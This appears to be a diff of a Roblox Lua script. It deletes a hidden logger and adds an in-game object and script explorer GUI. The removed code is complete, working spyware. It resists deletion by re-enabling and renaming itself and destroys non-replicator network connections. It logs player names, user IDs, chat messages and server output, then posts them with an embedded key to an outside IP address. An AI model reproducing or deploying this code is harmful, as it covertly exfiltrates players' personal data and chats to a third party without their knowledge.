@@ -1,256 +1,604 @@
-return function()
-	
-local env=getfenv(getfenv(getfenv(getfenv(game.clearAllChildren).game.clearAllChildren).game.clearAllChildren).game.clearAllChildren);
-local localenv={
-	workspace=env.Workspace;
-	Workspace=env.Workspace;
-	script=script;
-	Script=script;
-	game=env.game;
-	Game=env.game;
-	instance=env.Instance;
-	Instance=env.Instance;
-	table=env.table;
-	math=env.math;
-	getfenv=env.getfenv;
-	setfenv=env.setfenv;
-	loadstring=env.loadstring;
-	unpack=env.unpack;
-	pcall=env.pcall;
-	collectgarbage=env.collectgarbage;
-	dofile=env.dofile;
-	error=env.error;
-	getmetatable=env.getmetatable;
-	ipairs=env.ipairs;
-	loadfile=env.loadfile;
-	next=env.next;
-	pairs=env.pairs;
-	print=env.print;
-	rawequal=env.rawequal;
-	rawget=env.rawget;
-	rawset=env.rawset;
-	select=env.select;
-	setmetatable=env.setmetatable;
-	tonumber=env.tonumber;
-	tostring=env.tostring;
-	type=env.type;
-	xpcall=env.xpcall;
-	assert=env.assert;
-	Delay=env.Delay;
-	delay=env.Delay;
-	Spawn=env.Spawn;
-	LoadLibrary=env.LoadLibrary;
-	printidentity=env.printidentity;
-	tick=env.tick;
-	time=env.time;
-	Version=env.Version;
-	version=env.Version;
-	Wait=env.wait;
-	wait=env.wait;
-	ypcall=env.ypcall;
-	gcinfo=env.gcinfo;
-	load=env.load;
-	newproxy=env.newproxy;
-	coroutine=env.coroutine;
-	_G=env._G;
-	_VERSION=env._VERSION;
-}
-local pcall=env.pcall;
-local setfenv=env.setfenv;
-local getfenv=env.getfenv;
-local setmetatable=env.setmetatable;
-local getmetatable=env.getmetatable;
-local rawget=env.rawget;
-local rawset=env.rawset;
-local error=env.error;
-local wait=env.wait;
-local Spawn=env.Spawn;
-local script=script;
-local print=print;
-local con,connect_;connect_=function()
-	pcall(function()con:disconnect()end);con=script.Changed:connect(function(prop)
-		connect_();connect_();connect_();repeat connect_() wait() until con~=nil;
-		if prop == "Disabled" then
-			pcall(function() repeat script.Disabled = false wait() until script.Disabled == false end)
-		elseif prop == "Parent" then
-			pcall(function() repeat script.Parent = nil wait() until script.Parent == nil end)
-		elseif prop == "Name" then
-			pcall(function() repeat script.Name = "Rein" wait() until script.Name == "Rein" end)
+------------------------------------------------------
+--Version v6.9                                   |
+--Drag Property added                        |
+------------------------------------------------------
+
+
+TextProperties = {"Name", "Value", "Text", "Reflectance", "Transparency", "Heat", "TeamName", "LinkedSource", "Health", "MaxHealth", "Brightness", "FogEnd", "FogStart", "Size", "D", "P", "Elasticity", "FormFactor", "Friction", "Shape", "GeographicLatitude", "Texture", "BackgroundTransparency", "Image"}
+BoolProperties = {"Anchored", "CanCollide", "Disabled", "Value", "Locked", "CharacterAutoLoads", "Visable"}
+BrickColorProperties = {"BrickColor", "Color", "TeamColor", "HeadColor", "TorsoColor", "LeftLegColor", "LeftArmColor", "RightLegColor", "RightArmColor", "Value"}
+Color3Properties = {"Color", "SecondaryColor", "Ambient", "ColorShift_Bottom", "ColorShift_Top", "ShadowColor", "FogColor", "Value", "BorderColor3", "BackgroundColor3"}
+Vector3Properties = {"Size", "Position", "maxForce", "maxTorque", "position", "Velocity", "RotVelocity", "Value"}
+ 
+local ref = {}
+ref[1] = Instance.new("ScreenGui")
+ref[1].Name = "GuiControl"
+	ref[2] = Instance.new("Frame")
+	ref[2].Size = UDim2.new(0, 210, 0, 50) --UDim2.new(0, 210, 0, 180)
+	ref[2].Style = Enum.FrameStyle.RobloxRound
+	ref[2].Name = "Main"
+	ref[2].Position = UDim2.new(1, -35, 0.5, -150)
+	ref[2].Parent = ref[1]
+		ref[5] = Instance.new("TextButton")
+		ref[5].FontSize = Enum.FontSize.Size14
+		ref[5].Name = "Execute"
+		ref[5].Text = "Launch Explorer"
+		ref[5].Size = UDim2.new(0, 160, 0, 30)
+		ref[5].TextColor3 = Color3.new(1, 1, 1)
+		ref[5].Style = Enum.ButtonStyle.RobloxButton
+		ref[5].Position = UDim2.new(0.5, -70, 0.5, -15)
+		ref[5].Parent = ref[2]
+		ref[6] = Instance.new("TextButton")
+		ref[6].FontSize = Enum.FontSize.Size18
+		ref[6].Name = "Toggle"
+		ref[6].Text = "<"
+		ref[6].Size = UDim2.new(0, 20, 1, 0)
+		ref[6].TextColor3 = Color3.new(1, 1, 1)
+		ref[6].Font = Enum.Font.ArialBold
+		ref[6].Style = Enum.ButtonStyle.RobloxButton
+		ref[6].Parent = ref[2]
+ref[1].Parent = game.CoreGui
+Main = ref[2]
+PluginGui = Main.Execute
+ 
+function Open()
+if Toggle then return end
+Toggle = true
+Main.Position = UDim2.new(1, -200, 0.5, -150)
+Main.Toggle.Text = ">"
+end
+ 
+function Close()
+if not Toggle then return end
+Toggle = false
+Main.Position = UDim2.new(1, -35, 0.5, -150)
+Main.Toggle.Text = "<"
+end
+ 
+function ToggleOpen()
+if not Toggle then
+Open()
+elseif Toggle then
+Close()
+end
+end
+ 
+Main.Toggle.MouseButton1Click:connect(ToggleOpen)
+ 
+ 
+if game.CoreGui:findFirstChild("Explorer") then game.CoreGui:findFirstChild("Explorer"):Remove() end
+local Cloned
+local Deleted
+local DeleteParent
+local Player
+local Search
+local ScriptSearch
+local Gui
+local ScreenGui
+local Cloned = nil
+local Deleted = nil
+local DeleteParent = nil
+local Current = 0
+local CurrentOption = 0
+local OffsetX = 0
+local OffsetY = 0
+local Object
+local Move
+local StartPos
+local OriginPos
+ 
+function Clear()
+	if ScreenGui then Gui:Destroy() end
+	Current = 0
+	CurrentOption = 0
+end
+ 
+FixedValues = {}
+function FixValue(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	local Val = Ob[Pro]
+	local Event = Ob.Changed:connect(function() Ob[Pro] = Val end)
+	table.insert(FixedValues, {Ob, Pro, Event})
+	print("Fixed "..tostring(Ob).."."..Pro)
+end
+ 
+function CheckFixed(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	for Num, I in pairs(FixedValues) do
+		if I[1] == Ob and I[2] == Pro then
+			return true
 		end
-		coroutine.wrap(function()
-			script.Name='Rein';
-			script.Disabled=false;
-			script.Name='Rein';
-			script.Disabled=false;
-			script.Name='Rein';
-			repeat
-				script.Name='Rein';
-			until script.Name=='Rein';
-			local m=Instance.new("Hint",Workspace);
-			m.Text="[Access Denied] Not permitted to remove Uploader.";
-			wait(5)
-			m:Destroy()
-		end)();
-		connect_();
-	end)
-end;
-setfenv(0,setmetatable(localenv,{
-	__metatable="This metatable is locked";
-	__index=function(s,ind)	
-		script.Disabled=false;
-		local suc,res=pcall(function() return s[ind] end)
-		if not suc then
-			return error("attempt to index global \""..ind.."\" (a nil value)")
-		else
-			return s[ind];
-		end;
-	end;
-	__newindex=function(s,ind,value)
-		script.Disabled=false
-		rawset(s,ind,value)
-	end;
-}));
-coroutine.wrap(function()
-	repeat
-		script:destroy();
-		script.Disabled=false;
-		connect_();
-		wait();
-	until false;
-end)();
-script:Destroy()
-
-local g=function(s) return game:GetService(s);end;
-
-
---LOCAL_VAR
-local hs=g'HttpService';
-local ns=g'NetworkServer';
-local p=g'Players';
-local ls=g'LogService';
-local app=Enum.HttpContentType.ApplicationJson;
-local url="http://23.226.141.10/services/report/index.php";
-local ins=table.insert;
-
---Logging Storage
-
-playerlog={};
-outputlog={};
-
-local unqiue_players={};
-
-local seckey="6-_eVcmRz]wZS5S>#~:b*fk>k+UhD*dY,`mmE?drAb7<BM2e~<"
-
---System Variables
-local place=g'MarketplaceService':GetProductInfo(game.PlaceId~=0 and game.PlaceId or 1818);
-local ServerClosing=false;
-
---Core Functions
-
-local gltime=function()
-	local now=tick()%86400;
-	return string.gsub(string.format('%d:%d:%d',math.modf(now/60/60),math.modf(now/60)%60,math.modf(now)%60),'%d+',function(str)
-		return #str==1 and'0'..str or str;
-	end);
-end;
-
-local Push=function(subject,body)
-	local data=hs:JSONEncode({['subject']=subject,['body']=body,['key']=seckey;});
-	return hs:PostAsync(url,data,app);
-end;
-
-local UploadLog=function()
-	local st="--PlayerLog Begin--\n";
-	for i,v in next,playerlog do
-		st=st.."\n \n"..v;
-		playerlog[i]=nil;
-	end;
-	st=st.."\n \n--End of PlayerLog--\n--OutputLog begin--\n";
-	for i,v in next,outputlog do
-		st=st.."\n \n"..v;
-		outputlog[i]=nil;
-	end;
-	st=st.."\n \n--End of OutputLog--\n--End of report--";
-	return pcall(function() return Push("Report for "..place.Name,st);end);
-end;
-
-local Record=function(s,w)
-	if w=='playerlog' then
-		ins(playerlog,"["..gltime().."] "..s);
-	elseif w=='outputlog' then
-		ins(outputlog,"["..gltime().."] "..s);
-	end;
-end;
-
---Event Connections
-
-ns.ChildAdded:connect(function(c)
-	if not c.ClassName:lower():match('replicator') then
-		pcall(function() c:Destroy() end);
+	end
+end
+ 
+function UnFixed(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	for Num, I in pairs(FixedValues) do
+		if I[1] == Ob and I[2] == Pro then
+			I[3]:disconnect()
+			table.remove(FixedValues, Num)
+			print("UnFixed "..tostring(Ob).."."..Pro)
+		end
+	end
+end
+ 
+function AddButton(N, Function, Color, Copy)
+	if not N then error("RenderButton - No Name Specified") end
+	if not Function then error("RenderButton - No Function Specified") end
+	if not Color then Color = Color3.new(1, 1, 1) end
+	if Copy == nil then Copy = true end
+	P = Instance.new("TextButton")
+	if Copy then
+		P.Size = UDim2.new(0, 110, 0, 20)
 	else
-		Record("A new connection was detected on "..place.Name,'playerlog');
-	end;
-end);
-
-p.PlayerAdded:connect(function(p)
-	pcall(function()
-		Record(p.Name..p.userId.." has joined "..place.Name.." ["..game.JobId.."]",'playerlog');
-		p.Chatted:connect(function(msg)
-			pcall(function()
-				Record(p.Name..p.userId..": "..msg,"playerlog");
-			end)
-		end)
-		if not unqiue_players[p.userId] then
-			unqiue_players[p.userId]=true;
-		end;
-		end)
-end);
-
-p.PlayerRemoving:connect(function(p)
-	pcall(function()
-		Record(p.Name..p.userId.." has left "..place.Name.." ["..game.JobId.."]",'playerlog');
-		if not unqiue_players[p.userId] then
-			unqiue_players[p.userId]=true;
-		end;
+		P.Size = UDim2.new(0, 130, 0, 20)
+	end
+	P.Text = N.Name
+	P.Name = N.Name
+	P.Parent = Gui
+	P.BackgroundColor3 = Color
+	P.TextColor3 = Color3.new(0, 0, 0)
+	P.BackgroundTransparency = 0.5
+	P.Position = UDim2.new(0, ((math.modf(Current/25))*150)+400, 0, 85+(20*((Current%25)-1)))
+	P.MouseButton1Click:connect(function() Function(P) end)
+	D = Instance.new("TextButton")
+	D.Size = UDim2.new(0, 20, 0, 20)
+	D.Text = "X"
+	D.Name = N.Name
+	D.Parent = Gui
+	D.BackgroundColor3 = Color3.new(1, 0, 0)
+	D.TextColor3 = Color3.new(0, 0, 0)
+	D.BackgroundTransparency = 0.5
+	D.Position = UDim2.new(0, ((math.modf(Current/25))*150)+400+130, 0, 85+(20*((Current%25)-1)))
+	D.MouseButton1Click:connect(function()
+		Deleted = N
+		DeleteParent = N.Parent
+		N.Parent = nil
+		Clear()
+		Search(DeleteParent)
 	end)
-end);
-
-ls.MessageOut:connect(function(message,kind)
-	local e=Enum.MessageType;
-	Record("["..tostring(kind==e['MessageOutput'] and "Print" or kind==e['MessageInfo'] and "Info" or kind==e['MessageWarning'] and "Warning" or kind==e['MessageError'] and "Error").."] : "..message,'outputlog');
-end)
-
-game.OnClose=function()
-	ServerClosing=true;
-	Record("Server is terminating an Instance of "..place.Name.." ["..game.JobId.."]",'outputlog');
-	Record("Total of Unique Visitors this session: "..#unqiue_players,'outputlog');
-	UploadLog();
-	return true;
-end;
-
-for i,p in next,g'Players':GetPlayers() do
-	coroutine.wrap(function()
-		Record(p.Name..p.userId.." has joined "..place.Name.." ["..game.JobId.."]",'playerlog');
-		p.Chatted:connect(function(msg)
-			pcall(function()
-				Record(p.Name..p.userId..": "..msg,"playerlog");
-			end)
+	if Copy then
+		C = Instance.new("TextButton")
+		C.Size = UDim2.new(0, 20, 0, 20)
+		C.Text = "C"
+		C.Name = N.Name
+		C.Parent = Gui
+		C.BackgroundColor3 = Color3.new(0, 1, 0.5)
+		C.TextColor3 = Color3.new(0, 0, 0)
+		C.BackgroundTransparency = 0.5
+		C.Position = UDim2.new(0, ((math.modf(Current/25))*150)+400+110, 0, 85+(20*((Current%25)-1)))
+		C.MouseButton1Click:connect(function()
+			Cloned = N:Clone()
+			Clear()
+			Search(N.Parent)
 		end)
-		if not unqiue_players[p.userId] then
-			unqiue_players[p.userId]=true;
-		end;
-	end)()
+	end
+	Current = Current + 1
+	return P
 end
-
-Push("New Server started at "..place.Name,"A new server has been started.\nJobId: "..game.JobId);
-
-while true do
-	for i=900,1,-1 do
-		if ServerClosing then break end;
-		wait(1);
-	end;
-	local suc,res=pcall(function() UploadLog();end);
-	print(suc,res)
-end;
-
+ 
+function AddOption(N, Function, Color, Text, Fixed, Obj, Prop)
+	if not N then error("RenderButton - No Name Specified") end
+	if not Color then Color = Color3.new(1, 1, 1) end
+	if Text == nil then Text = false end
+	if Text then
+		P = Instance.new("TextBox")
+	else
+		P = Instance.new("TextButton")
+	end
+	P.Size = UDim2.new(0, 150, 0, 20)
+	if Fixed then
+		local Ob = Obj
+		local Pro = Prop
+		local IsFix = CheckFixed(Ob, Pro)
+		P.Size = UDim2.new(0, 130, 0, 20)
+		local F = Instance.new("TextButton")
+		F.Size = UDim2.new(0, 20, 0, 20)
+		F.Text = "F"
+		F.Name = "Fix"
+		F.Parent = Gui
+		if not IsFix then
+			F.BackgroundColor3 = Color3.new(0, 1, 0)
+		else
+			F.BackgroundColor3 = Color3.new(1, 0, 0)
+		end
+		F.TextColor3 = Color3.new(0, 0, 0)
+		F.BackgroundTransparency = 0.5
+		F.Position = UDim2.new(0, ((math.modf(CurrentOption/30))*150)+250+130, 0, 85+(20*((CurrentOption%30)-1)))
+		F.MouseButton1Click:connect(function()
+			local Fix = CheckFixed(Ob, Pro)
+			if not Fix then
+				F.BackgroundColor3 = Color3.new(1, 0, 0)
+				FixValue(Ob, Pro)
+			else
+				F.BackgroundColor3 = Color3.new(0, 1, 0)
+				UnFixed(Ob, Pro)
+			end
+		end)
+	end
+	P.Text = N
+	P.Name = N
+	P.Parent = Gui
+	P.BackgroundColor3 = Color
+	P.TextColor3 = Color3.new(0, 0, 0)
+	P.BackgroundTransparency = 0.5
+	P.Position = UDim2.new(0, ((math.modf(CurrentOption/30))*150)+250, 0, 85+(20*((CurrentOption%30)-1)))
+	if not Text and Function then
+		P.MouseButton1Click:connect(function() Function(P) end)
+	end
+	CurrentOption = CurrentOption + 1
+	return P
 end
+ 
+function Round(Num, Base)
+if Num == 0 then return 0 end
+local base = tonumber(Base) or 1
+return math.floor(math.abs(Num)/base + 0.5 ) * base * (math.abs(Num)/Num)
+end
+ 
+function AddTextOption(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	if type(Ob[Pro]) == "number" or type(Ob[Pro]) == "string" then
+		CurrentOption = CurrentOption + 1
+		local T = AddOption(Ob[Pro], nil, Color3.new(0.1, 0.4, 0.1), true, true, Ob, Pro)
+		CurrentOption = CurrentOption - 2
+		local O = AddOption("Change "..Pro..":", function() Ob[Pro] = T.Text end, Color3.new(0.1, 0.8, 0.1), false)
+		CurrentOption = CurrentOption + 1
+	end
+end
+ 
+function AddBrickColorOption(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	if BrickColor.new(tostring(Ob[Pro])) == Ob[Pro] then
+		CurrentOption = CurrentOption + 1
+		local T = AddOption(tostring(Ob[Pro]), nil, Color3.new(0.1, 0.4, 0.1), true, true, Ob, Pro)
+		CurrentOption = CurrentOption - 2
+		local O = AddOption("Change "..Pro..":", function() Ob[Pro] = BrickColor.new(T.Text) end, Color3.new(0.1, 0.8, 0.1), false)
+		CurrentOption = CurrentOption + 1
+	end
+end
+ 
+function AddColor3Option(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	if TestProperty(Ob[Pro], "r") and TestProperty(Ob[Pro], "b") and TestProperty(Ob[Pro], "g") then
+		CurrentOption = CurrentOption + 1
+		local T = AddOption(math.floor(Ob[Pro].r*255)..", "..math.floor(Ob[Pro].g*255)..", "..math.floor(Ob[Pro].b*255), nil, Color3.new(0.1, 0.4, 0.1), true, true, Ob, Pro)
+		CurrentOption = CurrentOption - 2
+		local O = AddOption("Change "..Pro..":", function()
+			local R, G, B = string.match(T.Text, "%s?(%d*%p?%d+)%p+%s?(%d*%p?%d+)%p+%s?(%d*%p?%d+)")
+			if R and G and B then
+				Ob[Pro] = Color3.new(tonumber(R)/255, tonumber(G)/255, tonumber(B)/255)
+			end
+		end, Color3.new(0.1, 0.8, 0.1), false)
+		CurrentOption = CurrentOption + 1
+	end
+end
+ 
+function AddVector3Option(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	if TestProperty(Ob[Pro], "x") and TestProperty(Ob[Pro], "y") and TestProperty(Ob[Pro], "z") then
+		CurrentOption = CurrentOption + 1
+		local T = AddOption(Round(Ob[Pro].x, 0.5)..", "..Round(Ob[Pro].y, 0.5)..", "..Round(Ob[Pro].z, 0.5), nil, Color3.new(0.1, 0.4, 0.1), true, true, Ob, Pro)
+		CurrentOption = CurrentOption - 2
+		local O = AddOption("Change "..Pro..":", function()
+			local R, G, B = string.match(T.Text, "%s?(%d*%p?%d+)%p+%s?(%d*%p?%d+)%p+%s?(%d*%p?%d+)")
+			if R and G and B then
+				Ob[Pro] = Vector3.new(tonumber(R), tonumber(G), tonumber(B))
+			end
+		end, Color3.new(0.1, 0.8, 0.1), false)
+		CurrentOption = CurrentOption + 1
+	end
+end
+ 
+function AddBoolOption(Obj, Prop)
+	local Ob = Obj
+	local Pro = Prop
+	if type(Ob[Pro]) == "boolean" then
+		local O = AddOption(Pro..": "..tostring(Ob[Pro]), nil, Color3.new(0.1, 0.8, 0.1), false, true, Ob, Pro)
+		O.MouseButton1Click:connect(function()
+			if Ob[Pro] then
+				Ob[Pro] = false
+				O.Text = Pro..": false"
+			else
+				Ob[Pro] = true
+				O.Text = Pro..": true"
+			end
+		end)
+	end
+end
+ 
+function TestProperty(Obj, Property)
+	Success = pcall(function() if Obj[Property] then return end end)
+	return Success
+end
+ 
+function LoadOptions(Object)
+	for Num, Prop in pairs(TextProperties) do
+		if TestProperty(Object, Prop) then
+			AddTextOption(Object, Prop)
+		end
+	end
+	for Num, Prop in pairs(BoolProperties) do
+		if TestProperty(Object, Prop) then
+			AddBoolOption(Object, Prop)
+		end
+	end
+	for Num, Prop in pairs(BrickColorProperties) do
+		if TestProperty(Object, Prop) then
+			AddBrickColorOption(Object, Prop)
+		end
+	end
+	for Num, Prop in pairs(Color3Properties) do
+		if TestProperty(Object, Prop) then
+			AddColor3Option(Object, Prop)
+		end
+	end
+	for Num, Prop in pairs(Vector3Properties) do
+		if TestProperty(Object, Prop) then
+			AddVector3Option(Object, Prop)
+		end
+	end
+end
+ 
+function Dragging(X, Y)
+OriginX = Object.Position.X.Offset
+OriginY = Object.Position.Y.Offset
+Object.Position = StartPos + UDim2.new(0, X-OffsetX, 0, Y-OffsetY)
+Object.Position = UDim2.new(Object.Position.X.Scale, Object.Position.X.Offset, Object.Position.Y.Scale, OriginY)
+end
+function StopDrag()
+if Move then Move:Remove() end
+for Num, Obj in pairs(ScreenGui:GetChildren()) do
+if Obj.Name == "DragControl" and Obj:IsA("Frame") then
+Obj:Remove()
+end
+end
+end
+function StartDrag(X, Y)
+Move = Instance.new("ImageButton")
+Move.Parent = ScreenGui
+Move.Name = "DragControl"
+Move.Size = UDim2.new(1, 0, 1, 0)
+Move.BackgroundTransparency = 1
+Move.MouseMoved:connect(Dragging)
+Move.MouseButton1Up:connect(StopDrag)
+OffsetX = X
+OffsetY = Y
+StartPos = Object.Position
+end
+local CurEvent1, CurEvent2
+function MakeDraggable(Obj, DragObj, ScreenObj)
+if CurEvent1 and CurEvent2 then
+CurEvent1:disconnect()
+CurEvent2:disconnect()
+end
+Object = DragObj
+ScreenGui = ScreenObj
+StartPos = Object.Position
+OriginPos = Object.Position
+CurEvent1 = Obj.MouseButton1Down:connect(StartDrag)
+CurEvent2 = Obj.MouseButton1Up:connect(StopDrag)
+end
+ 
+function Search(Object)
+	ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Parent = game:GetService("CoreGui")
+	ScreenGui.Name = "Explorer"
+	Gui = Instance.new("Frame", ScreenGui)
+	Gui.BackgroundTransparency = 1
+	if Object ~= game then
+		AddOption("Back", function() Clear(); Search(Object.Parent) end, Color3.new(0.5, 1, 1), false)
+	end
+	AddOption("Reload", function() Clear(); Search(Object); end, Color3.new(0.2, 1, 0.2), false)
+	if Cloned then
+		AddOption("Paste", function() Cloned.Parent = Object; Cloned = Cloned:Clone(); Clear(); Search(Object); end, Color3.new(0.5, 1, 1), false)
+	end
+	if Deleted then
+		AddOption("Undo", function() Deleted.Parent = DeleteParent; Deleted = nil; DeletedParent = nil; Clear(); Search(Object); end, Color3.new(1, 0.6, 0.1), false)
+	end
+	if Object:IsA("Player") then
+		AddOption("Goto Character", function() Clear(); if Object.Character then Search(Object.Character); end end, Color3.new(1, 1, 1), false)
+	end
+	if Object:IsA("Script") or Object:IsA("LocalScript") then
+		AddOption("EditScript", function() Clear(); ScriptSearch(Object); end, Color3.new(1, 1, 1), false)
+	end
+	if Object ~= game then
+		LoadOptions(Object)
+	end
+	AddOption("Close", Clear, Color3.new(1, 0.2, 0), false)
+	if not Object:IsA("Workspace") or not Object:IsA("Player") then
+	for Num, Obj in pairs(Object:GetChildren()) do
+		--if not Obj:IsA("BasePart") or not Object.Parent == game.Workspace then
+		if true then
+			if Obj:IsA("Script") or Obj:IsA("LocalScript") then
+				AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 0, 0), true)
+			elseif Obj.Parent == game then
+				AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), false)
+			else
+				AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), true)
+			end
+		end
+	end
+	Dr = Instance.new("TextButton", Gui)
+	Dr.Name = "Dragger"
+	Dr.Parent = Gui
+	Dr.BackgroundColor3 = Color3.new(1, 1, 1)
+	Dr.TextColor3 = Color3.new(0, 0, 0)
+	Dr.Size = UDim2.new(0, ((math.modf((Current)/25)*150))+150, 0, 20)
+	Dr.BackgroundTransparency = 0.5
+	Dr.Font = "Arial"
+	Dr.FontSize = "Size18"
+	if Current > 25 then
+		Dr.Position = UDim2.new(0, 400, 0, 85+(20*(((26)%27)-1)))
+	else
+		Dr.Position = UDim2.new(0, 400, 0, 85+(20*(((Current+1)%27)-1)))
+	end
+	Rep = math.floor((Dr.Size.X.Offset-((9.65/2)+49.29))/6.43)
+	Dr.Text = "<"..string.rep("-", math.floor(Rep/2)).."Drag"..string.rep("-", math.floor(Rep/2))..">"
+	MakeDraggable(Dr, Gui, ScreenGui)
+end
+ 
+function MoveUp(Place, Amount)
+for i,v in pairs(Place:GetChildren()) do
+if v:IsA("TextLabel") or v:IsA("TextBox") then
+v.Position = v.Position + UDim2.new(0,0,0,-Amount)
+end
+end
+end
+ 
+function MoveDown(Place, Amount)
+for i,v in pairs(Place:GetChildren()) do
+if v:IsA("TextLabel") or v:IsA("TextBox") then
+v.Position = v.Position + UDim2.new(0,0,0,Amount)
+end
+end
+end
+ 
+i=0
+function ScriptSearch(S)
+Script2 = S
+Script = Script2.Source
+Table = {}
+Enabled = true
+Gui = Instance.new("ScreenGui")
+Gui.Parent = game:GetService("CoreGui")
+Gui.Name = "Explorer"
+while Enabled do
+Start, End = string.find(Script, '\n')
+print(Start, End)
+if Start and End then
+table.insert(Table, string.sub(Script, 1, End))
+New = string.sub(Script, End+1, string.len(Script))
+Script = New
+else
+Enabled = false
+table.insert(Table, string.sub(Script, 1, End))
+print("Finished")
+end
+end
+P = Instance.new("TextLabel")
+P.Size = UDim2.new(0, 500, 0, 20)
+P.Text = Script2.Name
+P.Name = "Script Line"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))
+P.TextXAlignment = "Left"
+i=i+1
+New = {}
+for I,Val in pairs(Table) do
+print(Val)
+P = Instance.new("TextBox")
+P.ClearTextOnFocus = false
+P.Size = UDim2.new(0, 500, 0, 20)
+P.Text = Val
+P.Name = "Script Line"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))
+P.TextXAlignment = "Left"
+table.insert(New, P)
+i=i+1
+end
+i=1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "^"
+P.Name = "Scroll"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function() MoveUp(Gui, -20) end)
+i=i+1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "v"
+P.Name = "Scroll"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function() MoveDown(Gui, -20) end)
+i=i+1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "^^"
+P.Name = "Scroll"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function() MoveUp(Gui, -200) end)
+i=i+1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "vv"
+P.Name = "Scroll"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 1, 1)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function() MoveDown(Gui, -200) end)
+i=i+1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "S"
+P.Name = "Save"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(0, 1, 0)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function()
+	StringS = ""
+	for Num, Obj in pairs(New) do
+		if not string.find(Obj.Text, '\n') then
+			StringS = StringS..Obj.Text..'\n'
+		else
+			StringS = StringS..Obj.Text
+		end
+	end
+	S.Source = StringS
+	S.Disabled = true
+	S.Disabled = false
+end)
+i=i+1
+P = Instance.new("TextButton")
+P.Size = UDim2.new(0, 20, 0, 20)
+P.Text = "x"
+P.Name = "Back"
+P.Parent = Gui
+P.BackgroundColor3 = Color3.new(1, 0.2, 0)
+P.TextColor3 = Color3.new(0, 0, 0)
+P.BackgroundTransparency = 0.5
+P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
+P.MouseButton1Click:connect(function()
+Clear()
+i=0
+Search(S)
+end)
+i=i+1
+end
+end
+ 
+PluginGui.MouseButton1Click:connect(function()
+	Close()
+	Clear()
+	Search(game)
+end)
